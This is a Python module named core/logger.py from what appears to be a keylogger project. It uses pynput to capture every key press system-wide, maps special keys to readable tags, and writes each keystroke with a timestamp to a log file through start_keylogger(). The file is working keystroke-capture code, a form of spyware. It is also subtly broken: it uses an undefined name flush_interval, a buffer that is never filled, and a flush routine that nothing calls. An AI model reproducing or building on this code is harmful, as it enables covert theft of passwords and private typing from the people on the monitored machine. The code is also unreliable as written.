# core/logger.py

from pynput import keyboard
from config.config import LOG_FILE
from config.config import FLUSH_INTERVAL
from datetime import datetime
import threading

buffer = ""

def format_key(key):
    """Format special keys to be readable"""
    try:
        return key.char  # For regular characters
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.shift_r: '[SHIFT]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.alt_r: '[ALT]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.delete: '[DEL]',
            keyboard.Key.caps_lock: '[CAPSLOCK]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]'
        }
        return special_keys.get(key, f'[{key.name.upper()}]')
    
def flush_buffer():
    """Write buffer content to log file and clear it."""
    global buffer
    if buffer.strip():
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {buffer}\n")
        buffer = ""
    # Schedule next flush
    threading.Timer(flush_interval, flush_buffer).start()

def write_log(key):
    key_str = format_key(key)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
        if key_str == '\n':
            log_file.write('\n')  # Line break without timestamp
        else:
            log_file.write(f"{timestamp} - {key_str}\n")

def start_keylogger():
    with keyboard.Listener(on_press=write_log) as listener:
        listener.join()
